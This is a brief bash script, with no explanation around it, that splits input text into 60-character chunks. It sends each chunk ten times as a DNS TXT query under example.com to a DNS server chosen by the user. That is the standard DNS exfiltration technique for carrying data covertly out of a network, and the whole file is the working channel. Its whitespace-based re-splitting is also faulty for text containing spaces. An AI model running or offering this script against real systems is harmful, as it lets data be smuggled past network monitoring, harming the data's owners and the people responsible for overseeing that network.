#!/bin/bash

# Function to split text into chunks of specified size
chunk_text() {
    local text="$1"
    local chunk_size="$2"
    local chunks=()

    while [ ${#text} -gt $chunk_size ]; do
        chunks+=( "${text:0:$chunk_size}" )
        text="${text:$chunk_size}"
    done
    chunks+=( "$text" )

    echo "${chunks[@]}"
}

# Function to send DNS queries
send_dns_queries() {
    local text="$1"
    local server="$2"
    local chunk_size=60 # max size for a single DNS query payload
    local chunks=($(chunk_text "$text" $chunk_size))

    for chunk in "${chunks[@]}"; do
        for i in {1..10}; do
            dig @$server +short TXT "$chunk.example.com"
        done
    done
}

# Main script
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <text> <destination_dns_server>"
    exit 1
fi

TEXT="$1"
DNS_SERVER="$2"

send_dns_queries "$TEXT" "$DNS_SERVER"
